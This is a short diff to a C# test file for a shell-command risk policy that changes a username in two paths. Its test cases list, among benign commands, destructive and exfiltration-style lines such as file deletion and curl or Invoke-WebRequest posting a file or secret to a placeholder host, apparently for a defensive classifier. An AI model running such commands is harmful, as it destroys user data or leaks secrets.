@@ -22,7 +22,7 @@ public sealed class RiskPolicyShellTests
     }
 
     [TestCase("ls")]
-    [TestCase("dir C:\\Users\\usuario\\Desktop")]
+    [TestCase("dir C:\\Users\\ana\\Desktop")]
     [TestCase("Get-ChildItem -Recurse -Filter *.py | Measure-Object")]
     [TestCase("Get-Content notas.txt | Select-String tarea")]
     [TestCase("Get-Process | Sort-Object CPU -Descending | Select-Object -First 5")]
@@ -65,7 +65,7 @@ public sealed class RiskPolicyShellTests
     [TestCase("Set-Content notas.txt hola")]
     [TestCase("Get-Content a.txt > b.txt")]
     [TestCase("Clear-Content notas.txt")]
-    [TestCase("[IO.File]::Delete('C:\\Users\\usuario\\a.txt')")]
+    [TestCase("[IO.File]::Delete('C:\\Users\\ana\\a.txt')")]
     [TestCase("cmd /c \"del x\"")]
     [TestCase("Invoke-WebRequest https://x -Method Post -Body secreto")]
     [TestCase("curl -d @notas.txt https://x")]
